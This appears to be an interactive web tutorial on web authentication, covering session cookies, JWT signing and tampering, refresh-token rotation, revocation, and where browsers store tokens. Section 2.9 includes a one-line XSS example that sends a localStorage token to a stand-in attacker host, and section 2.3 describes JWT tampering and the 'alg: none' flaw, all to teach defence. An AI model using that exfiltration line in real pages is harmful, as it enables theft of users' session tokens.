2.1 · Session cookie

The cookie is only a random ID. Who you are lives in a table on the server.

response to POST /login (one header, wrapped here)
HTTP/1.1 200 OK
Set-Cookie: sid=9f8c2e71b4d04a6e;
    HttpOnly; Secure; SameSite=Lax;
    Path=/; Max-Age=86400
every request after that, sent by the browser itself
GET /orders
Cookie: sid=9f8c2e71b4d04a6e
  • HttpOnly JavaScript cannot read it · Secure HTTPS only · SameSite=Lax not sent with forms posted from other sites
server side: sessions table (Redis or DB)
session_iduser_idexpires_at
9f8c2e71b4d04a6e4210-15 09:00
a3d10b97e5c24f181710-14 21:30
5be0c6f2d18a44734210-16 08:10
  • Each request: read sid → look up the row → user_id = 42. One lookup per request.
  • logout Delete the row. The next request with that sid gets 401 right away.
  • Try it: DevTools → Application → Cookies. You will see the sid, never your password.

2.3 · What if I edit the payload?

  
Change "viewer" to "admin" and the signature stops matching. The server answers 401.

  

    

      
the attacker decodes their own token

      
{ "sub": "viewer@demo.vn", "role": "viewer", … }

      
edits one word, encodes it again, keeps the old signature

      
{ "sub": "viewer@demo.vn", "role": "admin", … }

eyJhbGci….eyJzdWIi…new…fQ.XxLJzh34…old

      
what the server does on every request

      
expected = HMAC-SHA256(header.payload, secret)
         = JQxpmG8lMZqnyfN5…
in token = XxLJzh34muY1zOIZ…
           ✗ no match → 401 Unauthorized

    

    

      
    
        
  • Editing the payload takes five seconds. Anyone can decode it (2.2).
    • 
        
  • The signature was made from the old payload with the server's secret. Without the secret, nobody can make a matching new one.
    • 
        
  • So the signature protects against changes. That is all it does.
    • 
      

      

        
the trap that really happened

        
Some servers accepted "alg": "none" with an empty signature, or called decode() where they meant verify(). Both skip the check entirely.

        
jwt.verify(token, secret, { algorithms: ["HS256"] })

        
Always verify with a library, and name the algorithm yourself.

2.4 · Session or JWT?

  
Sessions are easy to cancel. JWTs are easy to check without a database. Pick the one you need.

  

    

      
session cookieJWT

      
        
Where "who you are" livesServer: sessions table (Redis / DB)Inside the token, on the client

        
Each requestOne lookup by sidCheck the signature, no lookup

        
Logout / ban a userinstant delete the rowwaits token works until exp

        
Size on the wire~30 characters200 – 1000 characters

        
Good fitA web app with one backend that needs instant logoutSeveral services that check the token on their own, mobile apps

      
    

    
    
      
  • big JWT downside You cannot take it back before exp. A stolen token keeps working. Adding a "revoked" list means a lookup per request again.
    • 
      
  • The usual fix: a short exp (15 min), renewed by a refresh token the server can delete.

2.5 · Access token + refresh token

  
The server stores nothing for the access token. It stores only the refresh token, so it can delete it.

  

    

      

        
access token · JWT · 5–15 min

        
Sent on every API call: Authorization: Bearer eyJ…

        
The server checks the signature and exp, and is done. It stores nothing. That is what "stateless" means.

      

      

        
refresh token · random · 7–30 days

        
Sent only to POST /auth/refresh. Not a JWT, just random bytes.

        
refresh_tokens(user_id, token_hash,
               expires_at, revoked_at)

        
Stored as a hash. A row exists, so the server can delete it.

      

      

        
typicalon the server

        
          
access token5–15 minnot stored

          
refresh, idle~7–14 daysunused that long → log in again

          
refresh, max~30–90 daysthen log in again, always

          
rotationevery refreshnew refresh token, old row marked used

          
logoutnowdelete the refresh row

2.6 · The revocation problem

  
You banned the user, but their access token still works until exp. Pick how long you can wait.

  

    0 · the problem
    A · wait
    B · token version
    C · denylist
    trade-off
  

  

    

      

      

    

    
    
      
  • problemBan, or "log out of all devices": the refresh rows are deleted. The access JWT in hand still works until exp, up to 15 more min. The server stores nothing about it, so there is nothing to delete.
    • 
      
  • A · waitKeep exp short and accept the gap. Enough for most apps.
    • 
      
  • B · token versionEach token carries "tv": 3. Log out everywhere, password change or role change: users.token_version becomes 4. tv ≠ current → 401.
    • 
      
  • C · denylistEach token has a jti (a unique token ID). Keep revoked jtis in Redis until their exp. Kills one token, not all.
    • 
      
  • trade-offB and C add a lookup on every request, so the JWT is no longer fully stateless. Cache it: Redis, or in memory with a short TTL.
    •

2.8 · The trap: five requests, one refresh

  
The page loads five things at once. All five get 401. Only one of them may call refresh.

  

    0 · five 401s
    1 · five refreshes
    2 · one shared refresh
  

  

    

      

      

    

    

      
    
        
  • naiveEach call refreshes on its own. With rotation, call 1 gets a new refresh token and the old one is marked used.
    • 
        
  • Calls 2–5 send that used token. The server sees a reused refresh token, assumes theft, and logs the user out.
    • 
      

      

        
fix: single-flight, one promise shared by every 401


let refreshing = null;

async function api(url, opts) {
  const res = await fetch(url, opts);
  if (res.status !== 401) return res;
  refreshing ??= fetch("/auth/refresh", { method: "POST" })
    .finally(() => { refreshing = null; });
  const r = await refreshing;          // all 5 wait here
  if (!r.ok) { location.href = "/login"; return res; }
  return fetch(url, opts);             // retry once
}

2.9 · Where the browser keeps it

  
Any script on the page can read localStorage. No script can read an HttpOnly cookie.

  

    

      

        
localStorage

        
localStorage.setItem("token", jwt)

// one injected script is enough:
fetch("https://evil.example?t=" + localStorage.token)

        
Every script on the page can read it: yours, an npm package's, or one an attacker slipped in (XSS).

      

      

        
HttpOnly cookie

        
Set-Cookie: token=eyJ…; HttpOnly; Secure; SameSite=Lax

document.cookie   // "" (JS cannot see it)

        
The browser still sends it on every request to your API. JavaScript, including attacker scripts, never sees the value.

      

    

    
    
      
  • default Put tokens in a cookie with HttpOnly; Secure; SameSite=Lax.
    • 
      
  • trade-off The browser sends cookies by itself, which opens the door to CSRF. SameSite closes most of it. Both attacks: XSS and CSRF (5.4).
    • 
      
  • two tokensAccess token: in memory or an HttpOnly cookie. Refresh token: a HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh cookie, so it goes only to the refresh endpoint.
    •
